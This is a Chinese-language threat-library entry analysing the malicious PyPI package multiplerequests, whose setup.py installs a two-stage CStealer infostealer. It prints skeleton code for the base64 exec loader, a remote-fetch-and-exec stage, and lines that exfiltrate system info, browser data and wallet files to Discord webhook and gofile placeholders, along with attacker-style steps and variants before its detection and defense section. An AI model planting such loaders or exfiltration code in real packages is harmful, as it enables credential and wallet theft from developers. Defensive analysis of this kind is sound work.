---
id: cloud-cicd-pypi-multiplerequests-setup-py-cstealer
title: PyPI 恶意包 multiplerequests：setup.py 安装期 exec base64 代码，远程两阶段拉取 CStealer 窃密后门
type: scenario
domain: cloud
path: cloud/ci-cd
technique: pypi-multiplerequests-setup-py-two-stage-cstealer
aliases:
- multiplerequests
- multiplerequests 2.31.0
- PyPI 投毒 CStealer
- setup.py 安装期执行
- base64 setup.py loader
- pythonanywhere getpackage
- CStealer 供应链投毒
tags:
- supply-chain
- pypi
- python
- setup-py
- install-time
- cstealer
- infostealer
- discord-webhook
- windows
- ci-cd
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
affected_versions: multiplerequests 2.31.0、2.31.1、2.31.2、2.31.3、2.31.4、2.31.5（2024-04-25 发布的 PyPI 恶意版本）
verification:
  verified_by: verifier-V431
  verified_at: '2026-11-09T18:37:47+08:00'
  notes: 已对照原文与 19/19 图片核对：影响版本 [2.31.0..2.31.5]（2024-04-25）、下载 435 次、清华镜像、setup.py 末尾 exec(base64.b64decode(package_installer_binary))、第一阶段 urlopen getpackage 再 exec、第二阶段 rentry u4tup/5crcu/pmpxa/5uu99 + getmss→mss.zip、sendSysInfo/Chromium 约 20 款浏览器/get_login_data/get_cookies、钱包路径与 curl -F gofile 上传、Upload 类 vault.zip POST webhook、mss 截屏回传、复制自身到 Startup 目录均与截图一致；CStealer 关联 GitHub can-kat/cstealer 属实。路径 cloud/ci-cd 合法，无文章 ID/URL/长段原文摘录。单一投毒链，颗粒度合适。未验证点：PoC 未执行；Windows 行为未实测（原文 Linux 安装按预期报路径错误）。
---

## 一句话结论

PyPI 上的恶意包 `multiplerequests` 在 `setup.py` 调完 `setuptools.setup()` 后追加 `exec(base64.b64decode(...))`：`pip install` 构建元数据时即以安装用户权限执行第一阶段代码，从攻击者服务器拉取并 `exec` 第二段 base64 代码，最终落地 CStealer 变种——收集系统信息、Chromium 全家族浏览器凭据、数字货币钱包、屏幕截图，经 Discord webhook 与 gofile 外传，并复制到 Windows 启动目录实现自启动。

## 原理

- **setup.py 安装期执行**：pip 安装源码包（sdist/本地路径，或没有可用 wheel 的依赖）时会运行 `setup.py` 获取元数据/构建 wheel；`setup.py` 是普通 Python 脚本，顶层语句在 `setuptools.setup()` 返回后仍会执行。恶意包在 `setup()` 之后放 `exec(base64.b64decode(package_installer_binary))`，把恶意逻辑藏进 base64 字符串，躲过简单文本审查；安装即触发，不需要 `import` 该包或运行业务代码。
- **两阶段加载**：第一阶段解码后只做 `urlopen("https://<stage1>/getpackage").read()` 再 `exec(base64.b64decode(...))`，把真正的窃密逻辑放在攻击者服务器上，便于随时替换、也让包内静态特征更少。第二阶段从 `rentry.co` 的 raw 页面继续拉取模块/配置（图片显示 u4tup/5crcu/pmpxa/5uu99 四个 raw 地址），从 `pythonanywhere` 下载 `mss.zip` 截屏模块后解压导入。
- **CStealer 变种行为**：第二阶段是 GitHub 开源 CStealer 的改版，包含：
  - 系统信息：`platform`（system/release/version/machine/processor）+ `socket.gethostname/gethostbyname` + `uuid.getnode()` 拼 MAC，JSON POST 到 Discord webhook；
  - 浏览器数据：覆盖约 20 个 Chromium 系浏览器（Chrome/SxS、Edge、Brave、Vivaldi、Yandex、Opera Stable/GX/Neon、Epic、Uran、Amigo、Torch、Kometa、Orbitum、CentBrowser、7Star、Sputnik、Iridium 等），拷贝 `Login Data`/`Cookies` 到临时文件，用 sqlite3 查询后经 `decrypt_password` 解密，写入 `__LOGINS__/__COOKIES__/__WEB_HISTORY__/__DOWNLOADS__/__CARDS__`；
  - 钱包：按 `%APPDATA%` 路径收集 Atomic、Guarda、Zcash、Armory、bytecoin、Exodus、Binance、Jaxx、Electrum、Coinomi 等钱包文件，并用 `curl -F "file=@{path}" https://<server>.gofile.io/uploadFile` 上传到 gofile；
  - 截屏：用下载的 `mss` 模块 `sct.shot(output='screenshot.png')`，再以 multipart `files={"screenshot.png": ...}` POST 到同一 Discord webhook；
  - 外传打包：`Upload` 类把各类 txt 与 `vault.zip` 打包，`requests.post(webhook, files={'zipfile': ...})` 上传，随后删除本地 vault/zip；
  - 自启动：把自身复制到 `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\<fileName>`（frozen 时取 `sys.executable` 目录，否则取 `__file__` 目录），实现开机自启动。
- **为什么用 Discord webhook / gofile**：Discord webhook 是合法 HTTPS 端点，支持 JSON 文本与 multipart 文件上传，不需要攻击者自建 C2，且可随时删除重建；gofile 提供免费文件上传，承载体积较大的钱包压缩包。两者都混在正常 SaaS 流量中。
- **投毒面**：包名 `multiplerequests` 伪装成 HTTP 相关组件（描述 "Python MultiHTTP for Humans."），版本号 2.31.x 模仿 requests；官方 PyPI 与清华等镜像均可下载，开发者手误或依赖引用即中招。截至披露下载 435 次。

## 触发条件

- 受害者在 Windows 上执行 `pip install multiplerequests`（官方源或镜像），或项目依赖解析到该包；
- pip 走源码安装路径（sdist/无 wheel），会执行 `setup.py`；
- 安装环境可出网访问攻击者 stage1 服务器、rentry.co、pythonanywhere 与 Discord/gofile；
- 安装用户权限下可写 `%APPDATA%` 启动目录，存在可窃取的浏览器/钱包数据。

## 利用步骤

1. 在 PyPI 发布伪装成 HTTP 组件的恶意包（示例 `multiplerequests`），`setup.py` 正常调用 `setuptools.setup()` 以生成合法元数据；
2. 在 `setup()` 之后追加 base64 编码的第一阶段代码，`exec(base64.b64decode(...))`；
3. 第一阶段只负责 `urlopen` 攻击者服务器并 `exec` 二阶段 base64 代码；二阶段从 rentry.co 拉取模块/配置、从 pythonanywhere 下载 mss 截屏模块；
4. 二阶段执行 CStealer：采集系统/浏览器/钱包/截屏数据，经 Discord webhook 文本/文件与 gofile 上传外传；
5. 复制自身到启动目录实现持久化；
6. 换载荷时只改服务器上的二阶段内容，无需重新发布包。

## PoC

恶意 `setup.py` 结构（示意，域名/代码占位）：

```python
import setuptools, base64
# ... 正常的 setup(name=..., version=..., packages=...) ...
import base64
package_installer_binary = "<base64 编码的第一阶段代码>"
exec(base64.b64decode(package_installer_binary))
```

第一阶段解码后等价逻辑：

```python
from urllib import request
import base64
stage2 = request.urlopen("https://<stage1-host>/getpackage").read()
exec(base64.b64decode(stage2))
```

二阶段关键外传片段（CStealer 变种，示意）：

```python
import platform, socket, uuid, json, requests
info = {
    'platform': platform.system(), 'platform-release': platform.release(),
    'architecture': platform.machine(), 'hostname': socket.gethostname(),
    'ip-address': socket.gethostbyname(socket.gethostname()),
    'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
    'processor': platform.processor(),
}
requests.post("<discord-webhook-url>", json={"content": json.dumps(info)})

# 浏览器/钱包数据打包后
requests.post("<discord-webhook-url>", files={'zipfile': open('vault.zip','rb')})
# 钱包文件
subprocess.Popen(f'curl -F "file=@<path>" https://<server>.gofile.io/uploadFile', shell=True)
```

原文代码来自样本截图，PoC 仅作结构示意，未执行。

## 变体与关联

- 变体：`setup.py` 恶意代码可放到顶层、`cmdclass` 自定义命令或 `setup()` 参数求值处；也可改用 `pyproject.toml` 的 PEP 517 build backend。
- 变体：二阶段可放 Discord webhook、Pastebin/rentry raw、pythonanywhere、GitHub raw 等 LOTS 服务；外传可换 Telegram bot、飞书/钉钉 webhook、gofile、云盘。
- 变体：持久化可换 Run 键、计划任务、`.pth` 文件（site-packages 启动加载）。
- 关联：[[cloud-cicd-pep517-build-backend-install-rce]]（pyproject 构建后端安装期执行）、[[cloud-cicd-pypi-typosquat-requests-cookie-exfil]]（PyPI 拼写抢注 + 包内 Cookie 外传）、[[cloud-cicd-npm-postinstall-supply-chain-poisoning]]（npm 生态安装期 postinstall 投毒）、[[ai-security-supply-chain-litellm-pypi-pth-stealer-k8s-backdoor]]（PyPI 包 .pth 自启动窃密）、[[defense-forensics-python-stealer-browser-credentials-geofence-ngrok]]（Python 窃密脚本的浏览器凭据采集）、[[defense-forensics-redline-stealer-collection-geofence]]（钱包/Discord 等收集面）。
- 边界：目标若强制 `--only-binary=:all:` 且只允许已审 wheel，setup.py 不会执行；二阶段服务器被关闭或 Discord webhook 被删除后链断；浏览器新版 App-Bound Encryption/钱包加密可能降低窃取成功率。

## 检测与防御

- 排查：`pip show multiplerequests` 是否安装；`pip uninstall multiplerequests -y`；用 OpenSCA-cli/SCA 工具按组件名+版本 `[2.31.0..2.31.5]` 扫描依赖锁文件；检查 site-packages 中包的 `setup.py` 是否含 `exec(base64.b64decode(...))`。
- 检测：安装期 `pip`/`python setup.py` 子进程发起外联（pythonanywhere、rentry.co、Discord webhook、gofile）；安装日志 `Preparing metadata (setup.py)` 后出现网络请求；`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 出现新脚本；浏览器 `Login Data`/`Cookies` 被非浏览器进程读取。
- 防御：CI/开发机只允许 `pip install --only-binary=:all: --require-hashes` 安装已审 wheel；对 sdist 做人工审查（setup.py/pyproject.toml）；安装环境断网或代理白名单；锁定依赖版本与哈希；对 Discord/webhook/gofile/rentry 等域名在非必要场景做告警；发现后隔离主机、轮换浏览器会话与钱包凭据、清除启动目录文件并全盘排查。
